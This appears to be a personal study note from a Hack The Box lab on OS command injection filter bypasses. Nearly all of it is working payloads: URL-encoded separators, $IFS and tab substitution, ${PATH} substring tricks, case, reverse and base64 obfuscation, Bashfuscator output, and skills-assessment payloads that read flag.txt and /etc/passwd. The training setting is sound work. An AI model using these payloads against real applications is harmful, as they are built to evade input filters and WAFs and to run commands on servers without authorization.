
```bash!
ping -c 1 OUR_INPUT
```
If our input is not sanitized and escaped before it is used with the ping command, we may be able to inject another arbitrary command. 

---
# <span style=color:red>Blacklisted Characters</span>
```php!
$blacklist = ['&', '|', ';', ...SNIP...];
foreach ($blacklist as $character) {
    if (strpos($_POST['ip'], $character) !== false) {
        echo "Invalid input";
    }
}
```
* URL encoding
    * & -> %26
    * | -> %7c
    * New line --> %0A
    * TAB -> %09
    * ; -> %3b
* $
```bash!
echo ${PATH}
```
```bash!
echo ${PATH:1:3}
```
---
# [<span style=color:red>Payload</span>](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#filter-bypasses)
## <span style=color:darkblue>Bypassing Space Filters</span>
* Using Tabs
```bash!
%0a%09
```
* Using $IFS
```bash!
%0a{IFS}
```
* Using Brace Expansion
```bash!
%0a{ls,-la}
```
## <span style=color:darkblue>Bypassing Other Blacklisted Characters</span>
```bash!
${LS_COLORS:10:1}${IFS}

${LS_COLORS:10:1}%0A${IFS}ls${IFS}${PATH:0:1}home
```
### Character Shifting
```bash!
H4ck3rxPK@htb[/htb]$ man ascii     # \ is on 92, before it is [ on 91
H4ck3rxPK@htb[/htb]$ echo $(tr '!-}' '"-~'<<<[)

\
```
## <span style=color:darkblue>Bypassing Blacklisted Commands</span>
```bash!
${IFS}c'a't${IFS}${PATH:0:1}home${PATH:0:1}1nj3c70r${PATH:0:1}flag.txt
```
## <span style=color:darkblue>Advanced Advanced Command Obfuscation</span>
```bash!
$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")
```
![](https://hackmd.io/_uploads/SyLC2boa2.png)

![](https://hackmd.io/_uploads/rydp3-oa3.png)
---

``Need to match the space in command ➔ %09(TAB) replace %20(space)``

---
### Reverse Command
```bash!
echo 'whoami' | rev
imaohw
```
```bash!
$(rev<<<'imaohw')
```

### Encoded Commands
```bash!
echo -n 'cat /etc/passwd | grep 33' | base64

Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==
```
```bash!
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)

www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
```

1. ``Find encryption by myself and decryption that to escape WAF rule``
2. ``Tip: Note that we are using <<< to avoid using a pipe |, which is a filtered character.``
---
# [<span style=color:red>Bashfuscator](https://github.com/Bashfuscator/Bashfuscator)</span>

![](https://hackmd.io/_uploads/B1hZLV262.png)
```bash!
H4ck3rxPK@htb[/htb]$ git clone https://github.com/Bashfuscator/Bashfuscator
H4ck3rxPK@htb[/htb]$ cd Bashfuscator
H4ck3rxPK@htb[/htb]$ python3 setup.py install --user

H4ck3rxPK@htb[/htb]$ cd ./bashfuscator/bin/
H4ck3rxPK@htb[/htb]$ ./bashfuscator -h

H4ck3rxPK@htb[/htb]$ ./bashfuscator -c 'cat /etc/passwd'
[+] Mutators used: Token/ForCode -> Command/Reverse
[+] Payload:
 ${*/+27\[X\(} ...SNIP...  ${*~}   
[+] Payload size: 1664 characters

H4ck3rxPK@htb[/htb]$ ./bashfuscator -c 'cat /etc/passwd' -s 1 -t 1 --no-mangling --layers 1

H4ck3rxPK@htb[/htb]$ bash -c 'eval "$(W0=(w \  t e c p s a \/ d);for Ll in 4 7 2 1 8 3 2 4 8 5 7 6 6 0 9;{ printf %s "${W0[$Ll]}";};)"'

root:x:0:0:root:/root:/bin/bash
...SNIP...
```

## Skills Assessment Payload

### <span style=color:red>**{COLORS_LS:10:1}Not Found**</style>
![](https://hackmd.io/_uploads/S1WPh02an.png)

### Payload
```php!
%3b$(tr%09"[A-Z]"%09"[a-z]"<<<"WhOaMi")
```
```php!
%3b$(tr%09"[A-Z]"%09"[a-z]"<<<"LS")%09${PATH:0:1}
```
```php!
%3b$(tr%09"[A-Z]"%09"[a-z]"<<<"cAt")%09${PATH:0:1}flag.txt
```
### Another Payload
```bash!
echo -n 'cat /flag.txt' | base64
```
```bash！
bash<<<$(base64%09-d<<<Y2F0IC9mbGFnLnR4dA==)
```